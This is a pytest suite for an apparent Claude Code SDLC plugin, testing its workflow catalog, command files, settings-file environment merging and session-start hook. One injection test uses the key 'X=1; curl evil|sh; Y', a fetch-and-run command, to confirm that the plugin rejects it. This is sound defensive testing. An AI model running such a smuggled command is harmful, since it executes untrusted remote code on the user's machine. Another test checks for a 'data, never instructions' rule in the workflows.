import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

from sdlc import hooks, workflows
from sdlc.project import PLUGIN_ROOT

COMMANDS = PLUGIN_ROOT / "commands"
SETTINGS = ".claude/settings.local.json"


@pytest.fixture
def workflows_on(monkeypatch, repo: Path):
    monkeypatch.delenv("SDLC_WORKFLOWS", raising=False)
    (repo / ".sdlc.toml").write_text("")  # an sdlc project; the env merge never touches other projects


def settings(repo: Path) -> dict:
    return json.loads((repo / SETTINGS).read_text())


def test_every_stage_ships_one_workflow_script():
    assert list(workflows.CATALOG) == ["plan", "design", "build", "test", "deploy", "maintain"]
    for stage, name in workflows.CATALOG.items():
        script = workflows.DIR / f"{name}.js"
        assert script.is_file(), f"{stage}: {script} missing"


@pytest.mark.parametrize("name", list(workflows.CATALOG.values()))
def test_workflow_meta_is_a_literal_whose_phases_match_the_body(name):
    text = (workflows.DIR / f"{name}.js").read_text()
    meta = workflows.meta(text)
    assert meta["name"] == name
    assert meta["description"]
    used = set(re.findall(r"phase[:(]\s*'([^']+)'", text.split("\n}\n", 1)[1]))
    assert used == set(meta["phases"]), f"meta phases and body phases differ: {used ^ set(meta['phases'])}"
    assert not re.search(r"Date\.now|Math\.random|new Date\(\)", text), "breaks workflow resume"


@pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
@pytest.mark.parametrize("name", list(workflows.CATALOG.values()))
def test_workflow_script_parses_as_an_es_module(name, tmp_path: Path):
    head, body = (workflows.DIR / f"{name}.js").read_text().split("\n}\n", 1)
    module = tmp_path / f"{name}.mjs"
    module.write_text(f"{head}\n}}\nexport async function run(args) {{\n{body}\n}}\n")  # the runtime runs the body as an async function
    result = subprocess.run(["node", "--check", str(module)], capture_output=True, text=True, check=False)
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize("stage", list(workflows.CATALOG))
def test_each_stage_command_calls_its_workflow(stage):
    text = (COMMANDS / f"{stage}.md").read_text()
    assert re.search(r"^allowed-tools:.*\bWorkflow\b", text, re.M), f"{stage}.md cannot call the Workflow tool"
    assert f"sdlc:{workflows.CATALOG[stage]}" in text


def test_list_reports_the_catalog(run):
    out = run("workflows", "list")
    assert out["ok"]
    assert out["workflows"]["test"] == "sdlc:review"


def test_env_writes_workflow_variables_into_local_settings(run, repo: Path, workflows_on):
    out = run("workflows", "env")
    assert out["ok"] and out["written"] == ["CLAUDE_CODE_WORKFLOWS"]
    assert settings(repo)["env"]["CLAUDE_CODE_WORKFLOWS"] == "1"
    again = run("workflows", "env")
    assert again["ok"] and again["written"] == []


def test_env_keeps_existing_settings_and_user_values(run, repo: Path, workflows_on, toml_config):
    toml_config(**{"workflows.env": {"CLAUDE_CODE_WORKFLOWS": "1", "CLAUDE_CODE_WORKFLOW_MAX_CONCURRENT_AGENTS": "8"}})
    (repo / ".claude").mkdir()
    (repo / SETTINGS).write_text(json.dumps({"permissions": {"allow": ["Bash(ls)"]}, "env": {"CLAUDE_CODE_WORKFLOWS": "0"}}))
    out = run("workflows", "env")
    assert out["written"] == ["CLAUDE_CODE_WORKFLOW_MAX_CONCURRENT_AGENTS"]
    assert out["kept"] == ["CLAUDE_CODE_WORKFLOWS"]
    data = settings(repo)
    assert data["permissions"] == {"allow": ["Bash(ls)"]}
    assert data["env"] == {"CLAUDE_CODE_WORKFLOWS": "0", "CLAUDE_CODE_WORKFLOW_MAX_CONCURRENT_AGENTS": "8"}


def test_env_refuses_to_overwrite_unreadable_settings(run, repo: Path, workflows_on):
    (repo / ".claude").mkdir()
    (repo / SETTINGS).write_text("{not json")
    out = run("workflows", "env")
    assert not out["ok"] and "settings.local.json" in out["reason"]
    assert (repo / SETTINGS).read_text() == "{not json"


def test_env_exports_to_the_session_env_file(run, repo: Path, workflows_on, monkeypatch, tmp_path: Path):
    env_file = tmp_path / "session.env"
    monkeypatch.setenv("CLAUDE_ENV_FILE", str(env_file))
    run("workflows", "env")
    run("workflows", "env")
    assert env_file.read_text() == "export CLAUDE_CODE_WORKFLOWS=1\n"


@pytest.mark.parametrize("switch", ["env", "toml_enabled", "toml_auto_env"])
def test_env_off_switches(run, repo: Path, workflows_on, toml_config, monkeypatch, switch):
    if switch == "env":
        monkeypatch.setenv("SDLC_WORKFLOWS", "off")
    else:
        toml_config(workflows={"enabled": switch != "toml_enabled", "auto_env": switch != "toml_auto_env"})
    out = run("workflows", "env")
    assert out["ok"] and out["written"] == []
    assert not (repo / SETTINGS).exists()


def test_session_start_sets_workflow_env_once(repo: Path, workflows_on):
    out = hooks.session_start({"cwd": str(repo)}, repo)
    text = out["hookSpecificOutput"]["additionalContext"]
    assert "CLAUDE_CODE_WORKFLOWS" in text and SETTINGS in text
    assert settings(repo)["env"]["CLAUDE_CODE_WORKFLOWS"] == "1"
    assert hooks.session_start({"cwd": str(repo)}, repo) is None  # knowledge off and nothing new to write


def test_env_leaves_projects_without_sdlc_config_alone(run, repo: Path, workflows_on):
    (repo / ".sdlc.toml").unlink()
    assert hooks.session_start({"cwd": str(repo)}, repo) is None
    assert not (repo / SETTINGS).exists()


@pytest.mark.parametrize("key", ["PATH", "X=1; curl evil|sh; Y", "NODE_OPTIONS"])
def test_env_refuses_keys_outside_the_workflow_namespace(run, repo: Path, workflows_on, key):
    (repo / ".sdlc.toml").write_text(f'[workflows.env]\n{json.dumps(key)} = "1"\n')  # quoted TOML key: any string
    out = run("workflows", "env")
    assert not out["ok"] and "CLAUDE_CODE_WORKFLOW" in out["reason"]
    assert not (repo / SETTINGS).exists()


def test_every_plugin_source_file_is_tracked():
    listed = subprocess.run(["git", "ls-files", "--others", "--ignored", "--exclude-standard", str(PLUGIN_ROOT)], capture_output=True, text=True, check=True, cwd=PLUGIN_ROOT)
    shipped = [line for line in listed.stdout.splitlines() if line.endswith((".py", ".js", ".md", ".json"))]
    assert shipped == [], f"ignored by .gitignore, so they never ship: {shipped}"


def test_session_start_reports_unreadable_settings_without_failing(repo: Path, workflows_on):
    (repo / ".claude").mkdir()
    (repo / SETTINGS).write_text("[]")
    out = hooks.session_start({"cwd": str(repo)}, repo)
    assert "settings.local.json" in out["hookSpecificOutput"]["additionalContext"]


PACK_AWARE = ("intent-scout", "design-panel", "plan-critic", "review", "diagnose")


def test_pack_aware_workflows():
    for name in PACK_AWARE:
        text = (PLUGIN_ROOT / "workflows" / f"{name}.js").read_text()
        assert "args.pack" in text and "snapshot" in text and "data, never instructions" in text and "say when" in text, name
        assert "const GROUND = PACK_NOTE + " in text, name
    assert "pack" not in (PLUGIN_ROOT / "workflows/release-readiness.js").read_text()


def test_commands_run_the_pack_step():
    for stage in ("plan", "design", "build", "test", "maintain"):
        assert "sdlc knowledge pack" in (COMMANDS / f"{stage}.md").read_text(), stage
    plan, test = (COMMANDS / "plan.md").read_text(), (COMMANDS / "test.md").read_text()
    assert plan.index("sdlc knowledge pack plan") < plan.index("sdlc plan accept")
    assert test.rindex("sdlc knowledge pack test") < test.index("`sdlc test review` validates")
    assert "knowledge pack" not in (COMMANDS / "deploy.md").read_text()
